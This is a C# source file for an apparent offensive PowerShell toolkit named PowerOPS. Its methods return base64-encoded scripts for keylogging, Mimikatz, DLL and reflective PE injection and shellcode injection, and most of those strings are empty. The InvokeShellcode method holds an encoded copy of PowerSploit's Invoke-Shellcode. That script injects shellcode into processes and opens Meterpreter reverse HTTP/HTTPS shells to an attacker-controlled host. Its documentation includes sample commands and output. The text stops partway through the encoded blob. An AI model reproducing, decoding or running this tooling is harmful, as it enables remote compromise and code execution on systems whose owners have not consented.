
namespace PowerOPS
{
    class PowerOPS
    {
        public static string GetKeyStrokes()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string InvokeDLLInjection()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string InvokeMimikatz()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string InvokeNinjaCopy()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string InvokeReflectivePEInjection()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string InvokeShellcode()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"TmV3LU1vZHVsZSAtU2NyaXB0QmxvY2sgewoKZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBJbnZva2UtU2hlbGxjb2RlCkF1dGhvcjogTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCiAKLkRFU0NSSVBUSU9OCgpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlCgpQb3dlclNoZWxsIGV4cGVjdHMgc2hlbGxjb2RlIHRvIGJlIGluIHRoZSBmb3JtIDB4WFgsMHhYWCwweFhYLiBUbyBnZW5lcmF0ZSB5b3VyIHNoZWxsY29kZSBpbiB0aGlzIGZvcm0sIHlvdSBjYW4gdXNlIHRoaXMgY29tbWFuZCBmcm9tIHdpdGhpbiBCYWNrdHJhY2sgKFRoYW5rcywgTWF0dCBhbmQgZzB0bTFsayk6Cgptc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQgQyB8IHNlZCAnMSw2ZDtzL1siO10vL2c7cy9cXC8sMC9nJyB8IHRyIC1kICdcbicgfCBjdXQgLWMyLSAKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgTGlzdE1ldGFzcGxvaXRQYXlsb2FkcwoKTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMKCi5QQVJBTUVURVIgTGhvc3QKClNwZWNpZmllcyB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgYXR0YWNrIG1hY2hpbmUgd2FpdGluZyB0byByZWNlaXZlIHRoZSByZXZlcnNlIHNoZWxsCgouUEFSQU1FVEVSIExwb3J0CiAKU3BlY2lmaWVzIHRoZSBwb3J0IG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgUGF5bG9hZAoKU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgVXNlckFnZW50CgpPcHRpb25hbGx5IHNwZWNpZmllcyB0aGUgdXNlciBhZ2VudCB0byB1c2Ugd2hlbiB1c2luZyBtZXRlcnByZXRlciBodHRwIG9yIGh0dHBzIHBheWxvYWRzCgouUEFSQU1FVEVSIFByb3h5CgpPcHRpb25hbGx5IHNwZWNpZmllcyB3aGV0aGVyIHRvIHV0aWxpemUgdGhlIHByb3h5IHNldHRpbmdzIG9uIHRoZSBtYWNoaW5lLgoKLlBBUkFNRVRFUiBMZWdhY3kKCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gCgouUEFSQU1FVEVSIEZvcmNlCgpJbmplY3RzIHNoZWxsY29kZSB3aXRob3V0IHByb21wdGluZyBmb3IgY29uZmlybWF0aW9uLiBCeSBkZWZhdWx0LCBJbnZva2UtU2hlbGxjb2RlIHByb21wdHMgZm9yIGNvbmZpcm1hdGlvbiBiZWZvcmUgcGVyZm9ybWluZyBhbnkgbWFsaWNpb3VzIGFjdC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUHJvY2Vzc0lkIDQyNzQKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuCgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLgoKLkVYQU1QTEUKCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbgpDOlxQUz4gJFByb2MgPSBHZXQtUHJvY2VzcyBub3RlcGFkCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1MaG9zdCAxOTIuMTY4LjMwLjEyOSAtTHBvcnQgNDQzIC1WZXJib3NlCgpWRVJCT1NFOiBSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA0NDMgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpFc3RhYmxpc2hlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBydW5uaW5nIFB3ZXJTaGVsbCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOgoKTmFtZSAgICAgIEN1cnJlbnQgU2V0dGluZyAgUmVxdWlyZWQgIERlc2NyaXB0aW9uCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQpFWElURlVOQyAgdGhyZWFkICAgICAgICAgICB5ZXMgICAgICAgRXhpdCB0ZWNobmlxdWU6IHNlaCwgdGhyZWFkLCBwcm9jZXNzLCBub25lCkxIT1NUICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0CgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVNoZWxsY29kZSBAKDB4OTAsMHg5MCwweEMzKQogICAgCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCEKICAgIAouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLUxpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKICAgIApQYXlsb2FkcwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cAp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMKCi5OT1RFUwoKVXNlIHRoZSAnLVZlcmJvc2UnIG9wdGlvbiB0byBwcmludCBkZXRhaWxlZCBpbmZvcm1hdGlvbi4KClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyCgpCaWcgdGhhbmtzIHRvIE9pc2luICh4MG4pIEdyZWhhbiAoQG9pc2luZykgZm9yIGFuc3dlcmluZyBhbGwgbXkgb2JzY3VyZSBxdWVzdGlvbnMgYXQgdGhlIGRyb3Agb2YgYSBoYXQgLSBodHRwOi8vd3d3Lm5pdm90Lm9yZy8KCi5MSU5LCgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQojPgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lELAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtCeXRlW11dCiAgICAkU2hlbGxjb2RlLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVTZXQoICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLAogICAgICAgICAgICAgICAgICBJZ25vcmVDYXNlID0gJFRydWUgKV0KICAgIFtTdHJpbmddCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBheWxvYWRzJyApXQogICAgW1N3aXRjaF0KICAgICRMaXN0TWV0YXNwbG9pdFBheWxvYWRzLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJExob3N0ID0gJzEyNy4wLjAuMScsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlUmFuZ2UoIDEsNjU1MzUgKV0KICAgIFtJbnRdCiAgICAkTHBvcnQgPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJExlZ2FjeSA9ICRGYWxzZSwKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJFByb3h5ID0gJEZhbHNlLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24KICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0xpc3RQYXlsb2FkcycpCiAgICB7CiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHskXy5UeXBlSWQgLWVxIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlZhbGlkYXRlU2V0QXR0cmlidXRlXX0KICAgIAogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7IFBheWxvYWRzID0gJFBheWxvYWQgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBSZXR1cm4KICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgRW5zdXJlIGEgdmFsaWQgcHJvY2VzcyBJRCB3YXMgcHJvdmlkZWQKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtUeXBlW11dCiAgICAgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICBbVHlwZV0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0KICAgICAgICApCgogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCiAgICAgICAgCiAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCiAgICB9CgogICAgIyBFbWl0cyBhIHNoZWxsY29kZSBzdHViIHRoYXQgd2hlbiBpbmplY3RlZCB3aWxsIGNyZWF0ZSBhIHRocmVhZCBhbmQgcGFzcyBleGVjdXRpb24gdG8gdGhlIG1haW4gc2hlbGxjb2RlIHBheWxvYWQKICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQogICAgewogICAgICAgICRJbnRTaXplUHRyID0gJEFyY2hpdGVjdHVyZSAvIDgKCiAgICAgICAgZnVuY3Rpb24gTG9jYWw6Q29udmVydFRvLUxpdHRsZUVuZGlhbiAoW0ludFB0cl0gJEFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAgICAgJEFkZHJlc3MuVG9TdHJpbmcoIlgkKCRJbnRTaXplUHRyKjIpIikgLXNwbGl0ICcoW0EtRjAtOV17Mn0pJyB8IEZvckVhY2gtT2JqZWN0IHsgaWYgKCRfKSB7ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgKz0gW0J5dGVdICgnMHh7MH0nIC1mICRfKSB9IH0KICAgICAgICAgICAgW1N5c3RlbS5BcnJheV06OlJldmVyc2UoJExpdHRsZUVuZGlhbkJ5dGVBcnJheSkKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRDYWxsU3R1YiA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgI